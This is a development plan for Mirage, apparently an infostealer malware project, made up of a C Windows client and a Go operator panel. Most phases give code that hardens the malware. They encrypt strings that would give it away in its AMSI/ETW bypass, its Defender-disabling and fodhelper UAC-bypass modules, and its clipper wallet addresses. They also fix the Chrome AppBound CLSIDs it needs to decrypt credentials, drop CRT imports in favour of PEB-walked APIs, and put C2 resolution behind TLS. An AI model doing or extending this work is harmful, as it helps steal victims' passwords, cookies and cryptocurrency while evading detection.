# Mirage Audit Fixes — Implementation Plan

**Goal:** Fix all 106+ verified audit findings across Mirage C client and Go panel.

**Architecture:** C11 (mingw32, no-CRT, polymorphic) + Go 1.25 panel (PostgreSQL 16, chi, JWT+TOTP).

**Tech Stack:** C11, NASM x64, MinGW, Python 3, Go 1.25, PostgreSQL 16, React/Vite

## Global Constraints

- All `.rdata` strings MUST use `enc_` system (`make_polymorphic.py` → `enc_strings.h`)
- All Win32 API MUST use PEB-walk (`mirage_get_function_by_hash`)
- All crypto keys MUST be zeroed via `mirage_secure_zero()`
- Panel IP extraction MUST use `RemoteAddr` only
- Panel: all user input MUST have length limits
- `make polymorph` + `make test-all` MUST pass after each phase
- `cd panel && go test ./internal/...` MUST pass after each phase

---

## Phase 1: AppBound CLSID Fixes (C1–C4)

### Task 1.1: Fix all 4 GUIDs in appbound.c

**Files:** `src/crypto/appbound.c:93-111`
**Source:** `raw/SentinelStealerSource/SentinelStealerSource/ChromiumDecryptor/Settings.h`

| Line | FROM | TO |
|------|------|-----|
| 93 | `0x70088608` | `0x708860E0` |
| 99 | `0x1FFCE96C` | `0x1FCBE96C` |
| 105 | `0xF396869E, 0x0C0E` | `0xF396861E, 0x0C8E` |
| 111 | `0xEAD334E8` | `0xEAD34EE8` |

- [ ] **Step 1:** Edit line 93: `0x70088608` → `0x708860E0`
- [ ] **Step 2:** Edit line 99: `0x1FFCE96C` → `0x1FCBE96C`
- [ ] **Step 3:** Edit line 105: `0xF396869E` → `0xF396861E`, `0x0C0E` → `0x0C8E`
- [ ] **Step 4:** Edit line 111: `0xEAD334E8` → `0xEAD34EE8`
- [ ] **Step 5:** Verify: `grep -n "0x708860E0\|0x1FCBE96C\|0xF396861E\|0xEAD34EE8" src/crypto/appbound.c`
- [ ] **Step 6:** Commit: `fix(crypto): correct all 4 AppBound CLSID/IID values`

---

## Phase 2: Plaintext API Names in AMSI/ETW (C7–C8)

### Task 2.1: Add API names to encrypted strings

**Files:** `tools/make_polymorphic.py`

- [ ] **Step 1:** In `rewrite_encrypted_strings()`, add to the `strings` list:
```python
("AmsiScanBuffer", "AmsiScanBuffer"),
("EtwEventWrite", "EtwEventWrite"),
("EtwEventWriteEx", "EtwEventWriteEx"),
("RtlAddVectoredExceptionHandler", "RtlAddVectoredExceptionHandler"),
("RtlRemoveVectoredExceptionHandler", "RtlRemoveVectoredExceptionHandler"),
```
- [ ] **Step 2:** Run `python tools/make_polymorphic.py`
- [ ] **Step 3:** Verify: `grep "enc_AmsiScanBuffer\|enc_EtwEventWrite" include/enc_strings.h`

### Task 2.2: Update amsi_bypass.c

**Files:** `src/evasion/amsi_bypass.c`

- [ ] **Step 1:** Replace line 148:
```c
// FROM:
void* scan_buffer = resolve_func(amsi, "AmsiScanBuffer");
// TO:
char amsi_fn[32]; enc_decrypt(enc_AmsiScanBuffer, ENC_AMSISCANBUFFER_LEN, amsi_fn);
void* scan_buffer = resolve_func(amsi, amsi_fn);
```
- [ ] **Step 2:** Replace line 159:
```c
// FROM:
(pRtlAddVectoredExceptionHandler)resolve_func(ntdll, "RtlAddVectoredExceptionHandler");
// TO:
char veh_add[64]; enc_decrypt(enc_RtlAddVectoredExceptionHandler, ENC_RTLADDVECTOREDEXCEPTIONHANDLER_LEN, veh_add);
pRtlAddVectoredExceptionHandler fnAddVEH = (pRtlAddVectoredExceptionHandler)resolve_func(ntdll, veh_add);
```
- [ ] **Step 3:** Replace line 161:
```c
// FROM:
g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll, "RtlRemoveVectoredExceptionHandler");
// TO:
char veh_rem[64]; enc_decrypt(enc_RtlRemoveVectoredExceptionHandler, ENC_RTLREMOVEVECTOREDEXCEPTIONHANDLER_LEN, veh_rem);
g_fnRemoveVEH = (pRtlRemoveVectoredExceptionHandler)resolve_func(ntdll, veh_rem);
```

### Task 2.3: Update etw_bypass.c

**Files:** `src/evasion/etw_bypass.c`

- [ ] **Step 1:** Replace lines 111-113:
```c
// FROM:
void* etw_write = resolve_func(ntdll, "EtwEventWrite");
if (!etw_write)
    etw_write = resolve_func(ntdll, "EtwEventWriteEx");
// TO:
char etw_fn[32]; enc_decrypt(enc_EtwEventWrite, ENC_ETWEVENTWRITE_LEN, etw_fn);
void* etw_write = resolve_func(ntdll, etw_fn);
if (!etw_write) {
    char etw_fn_ex[32]; enc_decrypt(enc_EtwEventWriteEx, ENC_ETWEVENTWRITEEX_LEN, etw_fn_ex);
    etw_write = resolve_func(ntdll, etw_fn_ex);
}
```
- [ ] **Step 2:** Replace lines 119-121 (same pattern as Task 2.2 Steps 2-3)
- [ ] **Step 3:** Run `make test-all`
- [ ] **Step 4:** Commit: `fix(evasion): encrypt plaintext API names in AMSI/ETW bypass`

---

## Phase 3: Remaining Plaintext Strings (C10, H1–H12)

### Task 3.1: Fix read_file_rm() plaintext (C10)

**Files:** `src/browsers/chromium.c:480`

- [ ] **Step 1:** Replace:
```c
// FROM:
fnNtQSI pQSI = (fnNtQSI)_mir_res(ntdll, "NtQuerySystemInformation");
// TO:
char fn_qsi[48]; enc_decrypt(enc_NtQuerySystemInformation, ENC_NTQUERYSYSTEMINFORMATION_LEN, fn_qsi);
fnNtQSI pQSI = (fnNtQSI)_mir_res(ntdll, fn_qsi);
```

### Task 3.2: Add 50+ strings to make_polymorphic.py

**Files:** `tools/make_polymorphic.py`

- [ ] **Step 1:** Add to `strings` list:
```python
# proxy.c C2 identifiers
("c2_prefix", "c2://"),
("mirage_org", "mirage"),
("c2_repo", "c2"),
("mirage_c2_channel", "mirage_c2"),
# schannel.c
("unisp_name_a", "UNISP_NAME_A"),
# panel_http.c
("log_zip", "log.zip"),
# chrome_crypto.c
("saltysalt", "saltysalt"),
# gaming.c
("steam_path_val", "SteamPath"),
("steam_reg_path", "Software\\Valve\\Steam"),
("steam_fallback", "C:\\Program Files (x86)\\Steam"),
# defender_disable.c
("wreg_defender", "SOFTWARE\\Policies\\Microsoft\\Windows Defender"),
("wreg_windefend", "SYSTEM\\CurrentControlSet\\Services\\WinDefend"),
# uac_bypass.c
("wreg_mssettings", "Software\\Classes\\ms-settings\\Shell\\Open\\Command"),
("wdelegate_execute", "DelegateExecute"),
("wfodhelper", "fodhelper.exe"),
# detection.c
("drive_root", "C:\\"),
# persistence.c
("persist_mirage_update", "MirageUpdate"),
("persist_windows_helper", "WindowsHelper.exe"),
("persist_windows_update", "WindowsUpdate"),
# VPN (18 names)
("vpn_nordvpn", "NordVPN"), ("vpn_openvpn", "OpenVPN"),
("vpn_wireguard", "WireGuard"), ("vpn_surfshark", "SurfShark"),
("vpn_expressvpn", "ExpressVPN"), ("vpn_cyberghost", "CyberGhost"),
("vpn_pia", "PIA"), ("vpn_mullvad", "Mullvad"),
("vpn_windscribe", "Windscribe"), ("vpn_tunnelbear", "TunnelBear"),
("vpn_hotspotshield", "Hotspot Shield"), ("vpn_vyprvpn", "VyprVPN"),
("vpn_hamachi", "Hamachi"), ("vpn_hidemyname", "HideMyName"),
("vpn_ipvanish", "IPVanish"), ("vpn_radminvpn", "RadminVPN"),
("vpn_softether", "SoftEther"), ("vpn_protonvpn", "ProtonVPN"),
# clipper
("btc_addr", "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
("eth_addr", "0x0000000000000000000000000000000000000000"),
("ltc_addr", "ltc1qw508d6qejxtdg4y5r3zarvary0c5xw7kgmn4n9"),
```
- [ ] **Step 2:** Run `python tools/make_polymorphic.py`

### Task 3.3: Update source files to use enc_decrypt()

- [ ] **Step 1:** For each file, replace plaintext string with `char buf[N]; enc_decrypt(enc_ID, ENC_ID_LEN, buf);`
- [ ] **Step 2:** Pattern for proxy.c: replace `static const char *github_host = "api.github.com";` with enc_decrypt at point of use
- [ ] **Step 3:** Pattern for gaming.c: replace `"SteamPath"` registry value name with enc_decrypt
- [ ] **Step 4:** Pattern for vpn.c: replace 18 hardcoded VPN names with enc_decrypt
- [ ] **Step 5:** Pattern for clipper.c: replace hardcoded wallet addresses with enc_decrypt

### Task 3.4: Encrypt BIP39 wordlist (H1)

**Files:** `src/system/seed_grabber.c:100-723`, `tools/make_polymorphic.py`

- [ ] **Step 1:** Add `rewrite_bip39(key)` function to make_polymorphic.py that:
  - Reads 2048 words from hardcoded list
  - XOR-encrypts each with the build key
  - Writes `include/bip39_enc.h` with `static const uint8_t enc_bip39_N[]` arrays
- [ ] **Step 2:** Call `rewrite_bip39(key)` from `main()` in make_polymorphic.py
- [ ] **Step 3:** In seed_grabber.c, replace `static const char *bip39_words[]` with encrypted arrays + runtime decrypt
- [ ] **Step 4:** Run `python tools/make_polymorphic.py` && `make test-all`
- [ ] **Step 5:** Commit: `fix: encrypt all remaining plaintext strings in .rdata`

---

## Phase 4: Proxy TLS Fix (C5)

### Task 4.1: Wrap proxy resolution in schannel TLS

**Files:** `src/network/proxy.c:103-169`, `src/network/schannel.c` (existing TLS)

- [ ] **Step 1:** Add `#include "schannel.h"` to proxy.c
- [ ] **Step 2:** In `resolve_github()`, after `ws2_connect(&sk, github_host, 443)`:
```c
tls_context_t tls_ctx;
tls_result_t tls_res = tls_connect(&tls_ctx, sk.handle, github_host);
if (tls_res != TLS_OK) { ws2_close(sk.handle); return 0; }
```
- [ ] **Step 3:** Replace `ws2_send(sk.handle, ...)` with `tls_send(&tls_ctx, ...)`
- [ ] **Step 4:** Replace `ws2_recv(sk.handle, ...)` with `tls_recv(&tls_ctx, ...)`
- [ ] **Step 5:** Add `tls_close(&tls_ctx)` before `ws2_close(sk.handle)`
- [ ] **Step 6:** Repeat for `resolve_telegram()` (lines 157-169)
- [ ] **Step 7:** Fix misleading comment on line 103: remove "plaintext here; TLS layer wraps externally"
- [ ] **Step 8:** Commit: `fix(network): wrap proxy C2 resolution in schannel TLS`

---

## Phase 5: WebSocket Hub Fixes (C14–C15)

### Task 5.1: Add closeOnce to Client

**Files:** `panel/internal/ws/client.go`

- [ ] **Step 1:** Add `closeOnce sync.Once` field to Client struct
- [ ] **Step 2:** Import `sync` if not already imported

### Task 5.2: Fix Hub broadcast

**Files:** `panel/internal/ws/hub.go`

- [ ] **Step 1:** Replace broadcast case (lines 44-51):
```go
case msg := <-h.broadcast:
    for client := range h.channels[msg.channel] {
        select {
        case client.send <- msg.data:
        default:
            // Remove from ALL channels before closing
            for _, ch := range client.channels {
                delete(h.channels[ch], client)
            }
            delete(h.clients, client)
            client.closeOnce.Do(func() { close(client.send) })
        }
    }
```

### Task 5.3: Fix Hub unregister

**Files:** `panel/internal/ws/hub.go`

- [ ] **Step 1:** Replace unregister case (lines 36-42):
```go
case client := <-h.unregister:
    if _, ok := h.clients[client]; ok {
        for _, ch := range client.channels {
            delete(h.channels[ch], client)
        }
        delete(h.clients, client)
        client.closeOnce.Do(func() { close(client.send) })
    }
```

### Task 5.4: Write tests

**Files:** `panel/internal/ws/hub_test.go` (new)

- [ ] **Step 1:** Create test file:
```go
package ws

import (
    "testing"
    "time"
)

func TestHubBroadcastNoPanicOnClosedChannel(t *testing.T) {
    hub := NewHub()
    go hub.Run()
    client := &Client{send: make(chan []byte, 1), channels: []string{"test"}}
    hub.register <- client
    client.send <- []byte("fill") // fill buffer
    defer func() {
        if r := recover(); r != nil { t.Fatalf("panic: %v", r) }
    }()
    hub.Broadcast("test", []byte("msg"))
    time.Sleep(50 * time.Millisecond)
}

func TestHubUnregisterNoPanicOnDoubleClose(t *testing.T) {
    hub := NewHub()
    go hub.Run()
    client := &Client{send: make(chan []byte, 1), channels: []string{"test"}}
    hub.register <- client
    time.Sleep(10 * time.Millisecond)
    client.send <- []byte("fill")
    hub.Broadcast("test", []byte("msg"))
    time.Sleep(50 * time.Millisecond)
    defer func() {
        if r := recover(); r != nil { t.Fatalf("panic: %v", r) }
    }()
    hub.unregister <- client
    time.Sleep(50 * time.Millisecond)
}
```
- [ ] **Step 2:** Run `cd panel && go test ./internal/ws/ -run TestHub -v`
- [ ] **Step 3:** Commit: `fix(ws): prevent Hub panics from send-on-closed and double-close`

---

## Phase 6: Rate Limiter Fix (C13)

### Task 6.1: Fix ExtractIP

**Files:** `panel/internal/middleware/ratelimit.go:92-108`

- [ ] **Step 1:** Replace ExtractIP function:
```go
func ExtractIP(r *http.Request) string {
    host, _, err := net.SplitHostPort(r.RemoteAddr)
    if err != nil {
        return r.RemoteAddr
    }
    if ip := net.ParseIP(host); ip != nil {
        return ip.String()
    }
    return r.RemoteAddr
}
```
- [ ] **Step 2:** Write test in `ratelimit_test.go`:
```go
func TestExtractIPDoesNotTrustXForwardedFor(t *testing.T) {
    r := httptest.NewRequest("GET", "/", nil)
    r.Header.Set("X-Forwarded-For", "1.2.3.4")
    r.RemoteAddr = "5.6.7.8:1234"
    ip := ExtractIP(r)
    if ip != "5.6.7.8" {
        t.Errorf("expected RemoteAddr 5.6.7.8, got %s", ip)
    }
}
```
- [ ] **Step 3:** Run `cd panel && go test ./internal/middleware/ -run TestExtractIP -v`
- [ ] **Step 4:** Commit: `fix(middleware): use RemoteAddr only in ExtractIP`

---

## Phase 7: CRT Import Elimination (C11, H13)

### Task 7.1: Replace fopen/fread/fwrite in chromium.c

**Files:** `src/browsers/chromium.c`

- [ ] **Step 1:** Create helper using existing PEB-walked APIs:
```c
// Use g_chrome_misc.pCreateFileA (already PEB-walked)
// Use g_chrome_misc.pGFS for file size
// Use ReadFile via PEB-walk
static unsigned char *read_file_peb(const char *path, size_t *out_len) {
    HANDLE hf = g_chrome_misc.pCreateFileA(path, 0x80000000 /*GENERIC_READ*/, 1, NULL, 3, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;
    DWORD sz = g_chrome_misc.pGFS(hf, NULL);
    if (sz == 0 || sz > 0x10000000) { mir_CloseHandle(hf); return NULL; }
    unsigned char *buf = (unsigned char *)malloc(sz);
    if (!buf) { mir_CloseHandle(hf); return NULL; }
    DWORD rd = 0;
    // Resolve ReadFile via PEB-walk
    char fn[32]; enc_decrypt(enc_ReadFile, ENC_READFILE_LEN, fn);
    typedef BOOL (WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
    pReadFile pRF = (pReadFile)mirage_get_function_by_hash(k32, mirage_encrypted_hash_func(fn));
    if (!pRF || !pRF(hf, buf, sz, &rd, NULL) || rd != sz) { free(buf); mir_CloseHandle(hf); return NULL; }
    mir_CloseHandle(hf);
    *out_len = rd;
    return buf;
}
```
- [ ] **Step 2:** Replace all `fopen(path, "rb"); fread(...); fclose(f);` sequences with `read_file_peb()`
- [ ] **Step 3:** Replace `fopen(path, "w"); fprintf(f, ...); fclose(f);` with `CreateFileA` + `WriteFile` + `CloseHandle`

### Task 7.2: Replace getenv() in browser_paths.c

**Files:** `src/browsers/browser_paths.c:1338`

- [ ] **Step 1:** Replace `getenv("LOCALAPPDATA")` with PEB-walked `GetEnvironmentVariableW`
- [ ] **Step 2:** Commit: `fix: eliminate CRT file I/O imports from IAT`

---

## Phase 8: Crypto Memory Zeroing (M17–M21)

### Task 8.1: Add secure_zero calls

**Files and exact locations:**

- [ ] **Step 1:** `src/crypto/chacha_poly.c:302` — after `poly_key[32]` use, add `mirage_secure_zero(poly_key, 32);`
- [ ] **Step 2:** `src/crypto/chacha_poly.c:378` — same
- [ ] **Step 3:** `src/crypto/chrome_crypto.c:301` — after AES key blob freed, add `mirage_secure_zero(key_blob, key_blob_len);`
- [ ] **Step 4:** `src/crypto/firefox_crypto.c:434` — after `hp, chp, k1-k3` use, add `mirage_secure_zero(hp, sizeof(hp)); mirage_secure_zero(chp, sizeof(chp)); mirage_secure_zero(k1, sizeof(k1)); mirage_secure_zero(k2, sizeof(k2)); mirage_secure_zero(k3, sizeof(k3));`
- [ ] **Step 5:** `src/crypto/archive_crypt.c:139,181` — after `derived_key[32]` use, add `mirage_secure_zero(derived_key, 32);`
- [ ] **Step 6:** `src/crypto/appbound.c:608` — after `ncrypt_out[64]`, `aes_key[32]` use, add zeroing
- [ ] **Step 7:** Run `make test-all`
- [ ] **Step 8:** Commit: `fix(crypto): zero all key material after use`

---

## Phase 9: Logic Bug Fixes (M1–M11)

### Task 9.1: Fix clipboard UTF-8 supplementary plane (M1)

**Files:** `src/system/clipboard.c:82-89`

- [ ] **Step 1:** Add 4-byte path to `u32_to_utf8()`:
```c
static int u32_to_utf8(unsigned int cp, unsigned char *out) {
    if (cp < 0x80) { out[0] = (unsigned char)cp; return 1; }
    else if (cp < 0x800) { out[0] = 0xC0|(cp>>6); out[1] = 0x80|(cp&0x3F); return 2; }
    else if (cp < 0x10000) { out[0] = 0xE0|(cp>>12); out[1] = 0x80|((cp>>6)&0x3F); out[2] = 0x80|(cp&0x3F); return 3; }
    else { out[0] = 0xF0|(cp>>18); out[1] = 0x80|((cp>>12)&0x3F); out[2] = 0x80|((cp>>6)&0x3F); out[3] = 0x80|(cp&0x3F); return 4; }
}
```

### Task 9.2: Fix keylogger missing default (M2)

**Files:** `src/system/keylogger.c`

- [ ] **Step 1:** At end of `special_key_name()` switch, add:
```c
default: return NULL;
```
- [ ] **Step 2:** In caller, check for NULL before use:
```c
const char *name = special_key_name(vk);
if (name) { buf_write_str(name); }
```

### Task 9.3: Fix wifi encoding (M3)

**Files:** `src/system/wifi.c:107-111`

- [ ] **Step 1:** Replace `wide_to_narrow`:
```c
static void wide_to_narrow(const WCHAR *src, char *dst, size_t dst_size) {
    size_t i = 0;
    for (; i < dst_size - 1 && src[i]; i++)
        dst[i] = (src[i] < 0x80) ? (char)src[i] : '?';
    dst[i] = '\0';
}
```

### Task 9.4: Fix gaming recursion (M4)

**Files:** `src/system/gaming.c:56-77`

- [ ] **Step 1:** Add depth parameter:
```c
static void copy_dir_recursive(const char *src_dir, const char *dst_dir, int depth) {
    if (depth > 16) return;
    // ... pass depth+1 to recursive calls ...
}
```
- [ ] **Step 2:** Update all callers to pass `depth: 0`

### Task 9.5: Fix schannel infinite loops (M9–M10)

**Files:** `src/network/schannel.c:267,405`

- [ ] **Step 1:** Add iteration cap to handshake loop (line 267):
```c
for (int iter = 0; iter < 50; iter++) {
    // ... existing handshake logic ...
    if (ss == SEC_E_OK) break;
    // ...
}
if (iter >= 50) { /* cleanup */ return TLS_ERR_HANDSHAKE_FAILED; }
```
- [ ] **Step 2:** Add iteration cap to recv loop (line 405):
```c
for (int iter = 0; iter < 100; iter++) {
    // ... existing recv/decrypt logic ...
    if (ds == SEC_E_INCOMPLETE_MSG) continue;
    break;
}
```

- [ ] **Step 3:** Run `make test-all`
- [ ] **Step 4:** Commit: `fix: resolve logic bugs in clipboard, keylogger, wifi, gaming, schannel`

---

## Phase 10: Panel Security Fixes (H19–H28)

### Task 10.1: Fix sessionOwnedBy nil claims (H19)

**Files:** `panel/internal/api/helpers.go:43`

- [ ] **Step 1:** Change `return true` to `return false` when claims == nil

### Task 10.2: Add JWT revocation (H21)

**Files:** `panel/internal/auth/jwt.go`, `panel/internal/db/migrations/`

- [ ] **Step 1:** Create migration `040_token_version.sql`:
```sql
ALTER TABLE users ADD COLUMN IF NOT EXISTS token_version INTEGER NOT NULL DEFAULT 0;
```
- [ ] **Step 2:** Add `TokenVersion int` to Claims struct in jwt.go
- [ ] **Step 3:** In ValidateToken, check `claims.TokenVersion == currentVersion` from DB
- [ ] **Step 4:** In ResetPassword, add `UPDATE users SET token_version = token_version + 1`

### Task 10.3: Fix TOTP setup (H20)

**Files:** `panel/internal/api/totp.go:24`

- [ ] **Step 1:** Before overwriting totp_secret, check if already set and require current TOTP code

### Task 10.4: Validate invite roles (H22)

**Files:** `panel/internal/api/users.go:81`

- [ ] **Step 1:** Add allowed roles list: `var allowedRoles = map[string]bool{"admin": true, "worker": true, "viewer": true, "checker": true, "traffer": true}`
- [ ] **Step 2:** Validate `req.Role` against allowedRoles before INSERT

### Task 10.5: Fix password reset errors (H24)

**Files:** `panel/internal/api/auth.go:352`

- [ ] **Step 1:** Check `db.Exec` error returns for UPDATE/DELETE statements in ResetPassword

### Task 10.6: Fix mustOpen nil panic (H25)

**Files:** `panel/internal/api/screenshots.go:89`

- [ ] **Step 1:** Return proper error instead of nil when file not found

### Task 10.7: Commit all panel fixes

- [ ] **Step 1:** Commit: `fix(panel): address security audit findings (JWT revocation, TOTP, input validation, XFF)`

---

## Phase 11: Verification

- [ ] **Step 1:** `cd Mirage && make clean && make polymorph` — SUCCESS
- [ ] **Step 2:** `cd Mirage && make test-all` — All PASS
- [ ] **Step 3:** Verify no plaintext: `strings mirage.exe | grep -iE "AmsiScanBuffer|EtwEventWrite|saltysalt|UNISP_NAME|log.zip|mirage_c2|NtQuerySystemInformation"`
- [ ] **Step 4:** `cd Mirage/panel && go test ./internal/... -v -count=1` — All PASS
- [ ] **Step 5:** `cd Mirage/panel && go vet ./...` — No issues
- [ ] **Step 6:** `cd Mirage && git push && gh pr create --title "fix: resolve all 106+ verified audit findings"`

---

## Critical Files & Anchors

| File | Symbol/Region | Why |
|------|---------------|-----|
| `tools/make_polymorphic.py` | `strings` list in `rewrite_encrypted_strings()` | All new encrypted strings MUST be added here first |
| `src/crypto/appbound.c:93-111` | `GUIDS_CHROME/EDGE/BRAVE/AVAST` | 4 wrong CLSID values |
| `src/evasion/amsi_bypass.c:148-161` | `resolve_func()` calls | Plaintext API names in .rdata |
| `src/evasion/etw_bypass.c:111-121` | `resolve_func()` calls | Plaintext API names in .rdata |
| `src/browsers/chromium.c:480` | `_mir_res()` call in read_file_rm() | Plaintext NtQuerySystemInformation |
| `panel/internal/ws/hub.go:36-49` | `Run()` broadcast/unregister | Double-close and send-on-closed panics |
| `panel/internal/middleware/ratelimit.go:92` | `ExtractIP()` | X-Forwarded-For spoof bypass |
| `src/network/proxy.c:103-169` | `resolve_github/telegram()` | Plaintext HTTP on TLS port |

## Assumptions & Contingencies

- SentinelStealer `Settings.h` is authoritative for AppBound GUIDs
- `schannel.c` `tls_connect()` is functional and linkable from `proxy.c` — if not, add `#include "schannel.h"` and verify link
- `make_polymorphic.py` handles 50+ new string entries — if it hits a limit, split into multiple calls
- Panel tests require `TEST_DATABASE_URL` env var — if unavailable, run `go test -short` for unit-only
